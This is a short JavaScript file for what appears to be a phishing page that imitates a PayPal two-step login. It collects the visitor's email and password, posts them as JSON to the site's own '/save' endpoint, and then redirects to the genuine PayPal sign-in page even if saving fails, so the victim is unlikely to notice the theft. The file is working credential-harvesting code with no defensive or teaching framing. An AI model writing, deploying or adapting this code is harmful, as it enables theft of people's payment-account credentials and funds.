const emailForm = document.getElementById('email-form');
const passwordForm = document.getElementById('password-form');
const emailScreen = document.getElementById('email-screen');
const passwordScreen = document.getElementById('password-screen');
const loginButton = document.getElementById('login-button'); // Assuming you have a login button
let savedEmail = '';

// Handle email form submission
emailForm.addEventListener('submit', function(e) {
  e.preventDefault();
  
  savedEmail = document.getElementById('email').value;
  emailScreen.style.display = 'none';
  passwordScreen.style.display = 'block';
});

// Handle password form submission
passwordForm.addEventListener('submit', function(e) {
  e.preventDefault();
  
  const password = document.getElementById('password').value;
  const userData = {
    email: savedEmail,
    password: password
  };
  
  // Send data to server
  fetch('/save', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(userData)
  })
  .then(response => response.json())
  .then(data => {
    // After saving, redirect to PayPal
    redirectToPayPal();
  })
  .catch(error => {
    console.error('Error:', error);
    // Even if there's an error, redirect to PayPal
    redirectToPayPal();
  });
});

// If there's a separate login button, add click event listener
if (loginButton) {
  loginButton.addEventListener('click', function() {
    if (passwordScreen.style.display === 'block') {
      // If on password screen, submit the password form
      passwordForm.dispatchEvent(new Event('submit'));
    } else {
      // If on email screen, submit the email form
      emailForm.dispatchEvent(new Event('submit'));
    }
  });
}

// Function to redirect to PayPal
function redirectToPayPal() {
  window.location.href = "https://www.paypal.com/signin";
}